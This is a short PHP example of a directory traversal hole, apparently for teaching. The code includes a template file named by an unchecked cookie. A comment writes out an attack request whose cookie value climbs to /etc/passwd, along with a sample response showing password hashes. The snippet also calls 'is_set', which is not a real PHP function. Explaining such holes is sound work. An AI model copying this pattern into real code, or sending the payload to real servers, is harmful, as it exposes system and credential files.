<?php
$template = 'blue.php';
if ( is_set( $_COOKIE['TEMPLATE'] ) )
   $template = $_COOKIE['TEMPLATE'];
include ( "/home/users/phpguru/templates/" . $template );
?>


/*
 * An attack against this system could be to send the following HTTP request:
 *  GET /vulnerable.php HTTP/1.0
 *  Cookie: TEMPLATE=../../../../../../../../../etc/passwd
 *
 * Generating a server response such as:
 *  HTTP/1.0 200 OK
 *  Content-Type: text/html
 *  Server: Apache
 *  root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh
 *  daemon:*:1:1::/tmp:
 *  phpguru:f8fk3j1OIf31.:182:100:Developer:/home/users/phpguru/:/bin/csh
 *
 * The repeated ../ characters after /home/users/phpguru/templates/ has caused include() to traverse to the root directory, and then include the UNIX password file /etc/passwd.
 * UNIX etc/passwd is a common file used to demonstrate directory traversal, as it is often used by crackers to try cracking the passwords.
 * */
